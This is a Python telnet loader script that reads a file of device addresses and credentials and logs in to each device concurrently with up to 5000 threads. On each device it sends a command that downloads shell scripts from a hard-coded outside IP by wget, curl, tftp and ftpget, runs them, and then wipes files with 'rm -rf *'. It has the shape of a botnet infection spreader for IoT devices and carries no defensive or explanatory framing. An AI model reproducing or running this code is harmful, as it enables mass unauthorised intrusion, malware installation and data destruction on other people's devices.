import telnetlib
import threading
with open('oktelnet.txt', 'r') as f:
    DEVICE_LIST = [line.strip() for line in f if line.strip()]
TIMEOUT = 5
COMMAND = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://161.97.180.220/1.sh; curl -O http://161.97.180.220/1.sh; chmod 777 1.sh; sh 1.sh; tftp 161.97.180.220 -c get 1.sh; chmod 777 1.sh; sh 1.sh; tftp -r 3.sh -g 161.97.180.220; chmod 777 3.sh; sh 3.sh; ftpget -v -u anonymous -p anonymous -P 21 161.97.180.220 2.sh 2.sh; sh 2.sh; rm -rf 1.sh 1.sh 3.sh 2.sh; rm -rf *"
MAX_THREADS = 5000
PROMPT_INDICATORS = [b"$ ", b"# ", b"> ", b"sh-", b"bash-"]
def telnet_to_device(device, semaphore):
    try:
        with semaphore:
            parts = device.split(' ')
            ip_port, user_pass = parts[0], parts[1]
            ip, port = ip_port.split(':')
            user, password = user_pass.split(':')
            tn = telnetlib.Telnet(ip, port, TIMEOUT)
            prompt = tn.read_until(b"sername:", TIMEOUT) or tn.read_until(b"ogin:", TIMEOUT)
            if b"sername:" in prompt or b"ogin:" in prompt:
                tn.write(user.encode('ascii') + b"\n")
            prompt = tn.read_until(b"assword:", TIMEOUT)
            if b"assword:" in prompt:
                tn.write(password.encode('ascii') + b"\n")
            for indicator in PROMPT_INDICATORS:
                tn.read_until(indicator, TIMEOUT)
            tn.write(COMMAND.encode('ascii') + b"\n")
            for indicator in PROMPT_INDICATORS:
                tn.read_until(indicator, TIMEOUT)
            tn.close()
            print(f"{ip}:{port} Success")
    except Exception as e:
        print(f"{ip}:{port} Failed: {str(e)}")
def main():
    if not DEVICE_LIST:
        print("Error: Device list empty!")
        return
    semaphore = threading.Semaphore(MAX_THREADS)
    threads = []
    for device in DEVICE_LIST:
        thread = threading.Thread(target=telnet_to_device, args=(device, semaphore))
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()
if __name__ == "__main__":
    main()